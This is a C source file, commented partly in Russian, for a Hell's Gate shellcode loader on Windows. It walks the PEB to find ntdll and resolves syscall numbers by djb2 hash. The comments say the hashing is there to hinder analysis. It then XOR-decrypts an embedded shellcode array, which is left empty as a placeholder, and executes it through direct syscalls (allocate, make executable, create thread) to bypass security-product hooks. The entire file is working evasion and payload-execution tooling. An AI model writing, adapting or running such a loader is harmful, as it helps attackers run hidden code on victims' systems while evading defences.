#include <windows.h>
#include "structs.h"
#include <stdio.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);

typedef LONG NTSTATUS;  // если ещё не определено

extern NTSTATUS HellDescent(...);

INT main() {

    // Получение TEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    if (!pCurrentTeb) {
        return 0x1;
    }

    // Получение PEB
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb) {
        return 0x1;
    }

    if (pCurrentPeb->OSMajorVersion != 0xA) {
        return 0x1;
    }

    // Получение адреса ntdll.dll
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)
        ((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Получение экспортной таблицы
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL) {
        return 0x01;
    }

    // Заполнение таблицы системных вызовов
    VX_TABLE Table = { 0 };

    // NtAllocateVirtualMemory
    Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory)) {
        return 0x1;
    }

    // NtCreateThreadEx
    Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx)) {
        return 0x1;
    }
    // NtProtectVirtualMemory
    Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory)) {
        return 0x1;
    }

    // NtWaitForSingleObject
    Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject)) {
        return 0x1;
    }
    
    // Запуск Payload
    Payload(&Table);

    return 0x00;
}

// Получение указателя на TEB (Thread Environment Block) текущего потока
// Используется для доступа к внутренним структурам Windows, включая PEB
PTEB RtlGetThreadEnvironmentBlock() {
    #if _WIN64
        // В 64-битных Windows TEB хранится по адресу GS:[0x30]
        // __readgsqword читает 8 байт из сегментного регистра GS по смещению 0x30
        return (PTEB)__readgsqword(0x30);
    #else
        // В 32-битных Windows TEB обычно хранится по адресу FS:[0x18]
        // __readfsdword читает 4 байта из сегментного регистра FS
        // Здесь используется 0x16, но чаще встречается 0x18 — зависит от реализации
        return (PTEB)__readfsdword(0x16);
    #endif
}

// Хеш-функция DJB2 (модифицированная версия с кастомным сидом)
// Используется для хеширования строк (например, имён API-функций) 
// без сохранения оригинальных строк в коде (anti-analysis)
DWORD64 djb2(PBYTE str) {
    // Начальное значение хеша (кастомное, отличается от стандартного 5381)
    DWORD64 dwHash = 0x7734773477347734;

    INT c;  // временная переменная для текущего символа

    // Пока не дойдём до нулевого байта (конец строки)
    while (c = *str++)
        // Хеш-функция: hash = hash * 33 + c
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    // Вернуть окончательный 64-битный хеш
    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {

    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);

        DWORD64 hash = djb2((PBYTE)pczFunctionName);

        if (hash == pVxTableEntry->dwHash) {

            PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
            pVxTableEntry->pAddress = pFunctionAddress;


            // Scan for syscall number
            WORD cw = 0;
            while (TRUE) {
                BYTE* pByte = (PBYTE)pFunctionAddress + cw;

                // Check for unexpected syscall
                if (pByte[0] == 0x0f && pByte[1] == 0x05) {
                    return FALSE;
                }

                // Check for RET
                if (pByte[0] == 0xc3) {
                    return FALSE;
                }

                // Check for syscall stub pattern: MOV R10, RCX; MOV EAX, XX XX 00 00
                if (pByte[0] == 0x4c && pByte[1] == 0x8b && pByte[2] == 0xd1 &&
                    pByte[3] == 0xb8 && pByte[6] == 0x00 && pByte[7] == 0x00) {

                    BYTE high = pByte[5];
                    BYTE low  = pByte[4];
                    WORD syscallId = (high << 8) | low;

                    pVxTableEntry->wSystemCall = syscallId;

                    return TRUE;
                }

                cw++;

                // Optional: safety limit
                if (cw > 50) {
                    return FALSE;
                }
            }
        }
    }

    return FALSE;
}

// key for XOR
char s_key[] = "XORKEYENCENCENC";

// XOR decrypt
// XOR-дешифровка: побайтно применяет XOR между data[i] и key[i % key_len]
void deXOR(char *data, size_t data_len, char *key, size_t key_len) {
    // Проходим по каждому байту зашифрованных данных
    for (size_t i = 0; i < data_len; i++) {
        // Вычисляем индекс в ключе (по кругу)
        size_t key_index = i % key_len;

        /*
         * Пример:
         * data[i]     = 0xF2  // 11110010
         * key[key_index] = 0x58  // 01011000 ('X')
         * 
         * Расшифровка:
         * 11110010
         * XOR 01011000
         * ============
         *     10101010 → 0xAA
         */

        data[i] = data[i] ^ key[key_index]; // XOR текущего байта с соответствующим байтом ключа
    }
}


BOOL Payload(PVX_TABLE pVxTable) {

    NTSTATUS status = 0x00000000;

    unsigned char shellcode[] = {
        // shellcode
    };
      
    // Расшифровка shellcode
    deXOR((char*)shellcode, sizeof(shellcode), s_key, strlen(s_key));

    // Выделение памяти
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = sizeof(shellcode);

    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    // Копирование в память
    VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

    // Изменение прав доступа на исполняемые
    ULONG ulOldProtect = 0;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    // Создание потока
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1,
                         (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    // Ожидание потока
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000; // 1 секунда в 100-нс интервалах
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hHostThread, FALSE, &Timeout);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}
